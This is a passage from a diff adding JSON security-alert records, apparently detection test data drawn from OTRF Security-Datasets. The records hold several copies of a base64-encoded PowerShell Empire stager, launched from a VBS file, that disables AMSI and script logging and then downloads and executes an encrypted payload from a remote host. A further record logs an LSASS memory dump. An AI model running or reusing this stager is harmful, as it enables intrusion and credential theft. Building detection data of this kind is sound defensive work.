pAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA== (parent: C:\\Windows\\System32\\wscript.exe)",
+    "timestamp": "2020-09-04T20:09:55.760Z",
+    "host": "WORKSTATION5.theshire.local",
+    "user": "THESHIRE\\pgustavo",
+    "process": {
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command_line": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "parent": "C:\\Windows\\System32\\wscript.exe"
+    },
+    "raw": {
+      "Hostname": "WORKSTATION5.theshire.local",
+      "User": "THESHIRE\\pgustavo",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAUwBpAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJAA2ADgANgA2AD0AWwByAEUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAHQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBlAGAATABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAGUANwA9ACQANgA4ADYANgAuAEcAZQB0AFYAYQBMAFUARQAoACQAbgBVAGwATAApADsASQBmACgAJAAxAEYARQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAEUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBBAGwAPQBbAEMAbwBsAGwARQBjAHQASQBPAG4AcwAuAEcARQBOAGUAcgBJAEMALgBEAEkAYwBUAEkATwBuAGEAcgBZAFsAUwB0AHIASQBuAGcALABTAFkAcwBUAEUAbQAuAE8AYgBKAEUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJABWAGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBhAGwAfQBFAGwAUwBFAHsAWwBTAEMAUgBpAHAAdABCAGwATwBDAGsAXQAuACIARwBlAFQARgBJAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBsAHUARQAoACQATgBVAEwATAAsACgATgBlAHcALQBPAEIAagBFAGMAVAAgAEMAbwBMAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAGEAUwBIAFMARQB0AFsAUwBUAFIASQBuAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAGUARgBdAC4AQQBzAHMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAHMAVABlAG0ALgBOAEUAdAAuAFMARQByAHYAaQBDAGUAUABvAEkATgBUAE0AQQBuAGEARwBFAFIAXQA6ADoARQB4AFAAZQBjAHQAMQAwADAAQwBPAG4AdABpAG4AVQBlAD0AMAA7ACQARgA5ADQARQA9AE4AZQB3AC0ATwBiAEoARQBDAHQAIABTAFkAcwBUAEUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAGkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AFQALgBFAG4AQwBPAEQAaQBOAGcAXQA6ADoAVQBOAEkAYwBPAEQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAE8AbgB2AEUAUgBUAF0AOgA6AEYAUgBvAE0AQgBBAHMARQA2ADQAUwB0AHIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAEUAYQBkAGUAcgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABmADkANABlAC4AUABSAE8AeABZAD0AWwBTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAUgBFAFEAdQBFAHMAdABdADoAOgBEAGUARgBBAFUATAB0AFcARQBCAFAAUgBPAFgAeQA7ACQARgA5ADQARQAuAFAAcgBPAFgAWQAuAEMAUgBlAEQAZQBuAHQASQBhAEwAUwAgAD0AIABbAFMAWQBTAFQAZQBNAC4ATgBlAHQALgBDAHIARQBkAGUATgBUAGkAQQBsAEMAQQBjAGgAZQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQB0AHcATwBSAGsAQwByAGUARABFAE4AdABpAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBTAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBDAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAFMAKAAnADMAKwBZAG0AYwBuACkAcwAwAHIAOAA9ACMAZAB4AFoANgA1ADsAfQBPACUAfABMAGwASABpAH4AZgB7AHoAQgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEYAOQA0AEUALgBIAGUAQQBEAGUAUgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEoAUQBPAEgAdQBEAEcAcgBOAEwARwBlAE8AUAB5AGwAPQBFADIASAB6AGoANgAxAGwAdQBpADcAaABXAE0AWQBRAGUANgAzAFcAVQB3AHMAMAB6AFoAOAA9ACIAKQA7ACQAZABhAHQAQQA9ACQAZgA5ADQARQAuAEQATwBXAG4ATABvAEEARABEAGEAdABhACgAJABzAGUAUgArACQAdAApADsAJABJAHYAPQAkAGQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAGQAYQBUAEEALgBsAGUAbgBHAFQASABdADsALQBqAG8ASQBOAFsAQwBIAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+      "ParentCommandLine": "\"C:\\windows\\System32\\WScript.exe\" \"C:\\Users\\pgustavo\\Desktop\\launcher.vbs\" ",
+      "UtcTime": "2020-09-04 20:09:55.760",
+      "EventID": 1,
+      "Channel": "Microsoft-Windows-Sysmon/Operational"
+    },
+    "origin": "OTRF Security-Datasets: execution/host/empire_launcher_vbs.zip"
+  },
+  {
+    "id": "OTRF-0006",
+    "source": "sysmon",
+    "rule_name": "LSASS Dump File Created",
+    "title": "LSASS Dump File Created on WORKSTATION5.theshire.local",
+    "description": "Sysmon event 11 on WORKSTATION5.theshire.local: C:\\Users\\pgustavo\\AppData\\Local\\Temp\\lsass.DMP",
+    "timestamp": "2020-09-22T08:38:27.371Z",
+    "host": "WORKSTATION5.theshire.local",
+    "user": null,
+    "process": {
+      "image": "C:\\windows\\system32\\taskmgr.exe",
+      "command_line": null,
+      "parent": null
+    },
+    "raw": {
+      "Hostname": "WORKSTATION5.theshire.local",
+      "Image": "C:\\windows\\system32\\taskmgr.exe",
+      "TargetFilename": "C:\\Users\\pgustavo\\AppData\\Local\\Temp\\lsass.DMP",
+      "UtcTime": "2020-09-22 08:38:27.371",
+      "EventID": 11,
+      "Channel": "Microsoft-Windows-Sysmon/Operational"
+    },
+    "origin": "OTRF Security-Datasets: credential_access/host/rdp_interactive_taskmanager_lsass_dump.zip"
+  }
+]
